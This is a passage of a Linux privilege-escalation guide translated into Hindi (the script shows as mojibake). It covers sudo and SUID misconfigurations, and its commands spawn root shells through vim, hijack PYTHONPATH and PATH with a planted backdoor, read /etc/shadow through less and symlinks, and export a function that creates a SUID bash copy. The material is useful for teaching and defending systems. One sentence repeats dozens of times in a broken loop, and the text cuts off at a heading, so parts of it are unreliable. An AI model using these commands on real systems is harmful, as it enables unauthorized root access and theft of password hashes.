рд╕реБрдбреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдкрд╛рд╕рд╡рд░реНрдб рдирд╣реАрдВ рдЬрд╛рдирддреЗ рд╣реБрдП рдХрд┐рд╕реА рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде рдХреБрдЫ рдХрдорд╛рдВрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддреА рд╣реИред
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ `demo` `root` рдХреЗ рд░реВрдк рдореЗрдВ `vim` рдЪрд▓рд╛ рд╕рдХрддрд╛ рд╣реИ, рдЕрдм рд░реВрдЯ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рдПрдХ SSH рдХреА рдХреЛрдИ рднреА рдЪрд╛рдмреА рдЬреЛрдбрд╝рдХрд░ рдпрд╛ `sh` рдХреЛ рдХреЙрд▓ рдХрд░рдХреЗ рдПрдХ рд╢реЗрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рдмрд╣реБрдд рдЖрд╕рд╛рди рд╣реЛ рдЬрд╛рддрд╛ рд╣реИред
```
sudo vim -c '!sh'
```
### SETENV

рдпрд╣ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдХреБрдЫ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддреЗ рд╕рдордп **рдПрдХ рдкрд░реНрдпрд╛рд╡рд░рдг рдЪрд░** рд╕реЗрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
рдпрд╣ рдЙрджрд╛рд╣рд░рдг, HTB рдорд╢реАрди Admirer рдкрд░ рдЖрдзрд╛рд░рд┐рдд рд╣реИ, рдЬрд┐рд╕рдореЗрдВ PYTHONPATH рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Sudo рдкрдереЛрдВ рдХреЛ рдЫреЛрдбрд╝рдХрд░ рдирд┐рд╖реНрдкрд╛рджрди рдХрд░рдирд╛

**рдЕрдиреНрдп рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдкрдврд╝рдиреЗ** рдпрд╛ **рд╕рд┐рдорд▓рд┐рдВрдХ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП sudoers рдлрд╝рд╛рдЗрд▓ рдореЗрдВ: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
рдпрджрд┐ **рд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдб** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (\*), рддреЛ рдпрд╣ рдФрд░ рднреА рдЖрд╕рд╛рди рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**рд╡рд┐рд░реЛрдзрд╛рддреНрдордХ рдЙрдкрд╛рдп**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo рдХрдорд╛рдВрдб/SUID рдмрд╛рдЗрдирд░реА рдмрд┐рдирд╛ рдХрдорд╛рдВрдб рдкрде рдХреЗ

рдпрджрд┐ **sudo рдЕрдиреБрдорддрд┐** рдХреЗрд╡рд▓ рдПрдХ рдХрдорд╛рдВрдб рдХреЛ **рдкрде рд╕реНрдкрд╖реНрдЯ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд┐рдП рдмрд┐рдирд╛** рджреА рдЬрд╛рддреА рд╣реИ: _hacker10 ALL= (root) less_ рддреЛ рдЖрдк рдЗрд╕реЗ рдкрд╛рде рдЪрд░ рдмрджрд▓рдХрд░ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
рдпрд╣ рддрдХрдиреАрдХ рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ рдпрджрд┐ рдПрдХ **suid** рдмрд╛рдЗрдирд░реА **рдкрде рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд┐рдП рдмрд┐рдирд╛ рдПрдХ рдЕрдиреНрдп рдХрдорд╛рдВрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддреА рд╣реИ (рд╣рдореЗрд╢рд╛ рдПрдХ рдЕрдЬреАрдм SUID рдмрд╛рдЗрдирд░реА рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЗ рд╕рд╛рде** _**strings**_ **рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ)**ред

[рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрджрд╛рд╣рд░рдг рдкреЗрд▓реЛрдбред](payloads-to-execute.md)

### рдкрде рдХреЗ рд╕рд╛рде SUID рдмрд╛рдЗрдирд░реА

рдпрджрд┐ **suid** рдмрд╛рдЗрдирд░реА **рдкрде рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдХреЗ рдПрдХ рдЕрдиреНрдп рдХрдорд╛рдВрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддреА рд╣реИ**, рддреЛ рдЖрдкрдХреЛ рдХреЛрд╢рд┐рд╢ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдП рдХрд┐ рдПрдХ рдлрдВрдХреНрд╢рди рдмрдирд╛рдПрдВ рдФрд░ рдЙрд╕реЗ рдирд┐рд░реНрдпрд╛рдд рдХрд░реЗрдВ рдЬрд┐рд╕рдХрд╛ рдирд╛рдо рд╕реБрдЗрдб рдлрд╝рд╛рдЗрд▓ рдХреЛ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрджрд┐ рдПрдХ suid рдмрд╛рдЗрдирд░реА _**/usr/sbin/service apache2 start**_ рдХреЛ рдмреБрд▓рд╛рддреА рд╣реИ, рддреЛ рдЖрдкрдХреЛ рдлрд╝рдВрдХреНрд╢рди рдмрдирд╛рдиреЗ рдФрд░ рдирд┐рд░реНрдпрд╛рдд рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рдиреА рд╣реЛрдЧреА:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
рдлрд┐рд░, рдЬрдм рдЖрдк suid рдмрд╛рдЗрдирд░реА рдХреЛ рдХреЙрд▓ рдХрд░рддреЗ рд╣реИрдВ, рдпрд╣ рдлрд╝рдВрдХреНрд╢рди рдЪрд▓рд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛

### LD\_PRELOAD рдФрд░ **LD\_LIBRARY\_PATH**

